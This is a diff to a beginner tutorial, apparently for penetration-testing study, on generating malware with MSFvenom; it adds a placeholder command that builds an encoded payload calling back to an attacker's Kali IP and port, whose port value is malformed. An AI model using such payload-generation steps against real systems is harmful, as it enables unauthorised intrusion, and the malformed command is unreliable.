@@ -4,13 +4,13 @@ To craft the malware, we make use of the MSFvenom commands.
 
 **MSFvenom** is a penetration testing tool used to create payload for exploitation and post-exploitation.
 
-we make use of the help page of MSFvenom to craft a proper malware
+we make use of the help page of MSFvenom to craft a proper malware.
 ```
 msfvenom -h
 ```
-A proper malware has 4 parts; Payload , Platform, Encoder & File format
+A proper malware has 4 parts; Payload , Platform, Encoder & File format.
 
-To list out multiple payloads, platform, encoders on the MSFvenom page, we use the command 
+To list out multiple payloads, platforms, encoders on the MSFvenom page, we use the command; 
 ```
 msfvenom -l payloads
 ```
@@ -22,4 +22,6 @@ msfvenom -l encoders
 ```
 
 
-the formula for crafting the basic malware i
+the formula for crafting the basic malware will also involve the IP address which you intend to use and a suitable port number
+```
+msfvenom -p (any payload) LHOST=(kali_IP) LPORT=94444 or 8080) -e (any encoder) --platform (any platform) -f (any file format) > (a unique filename).(file format)
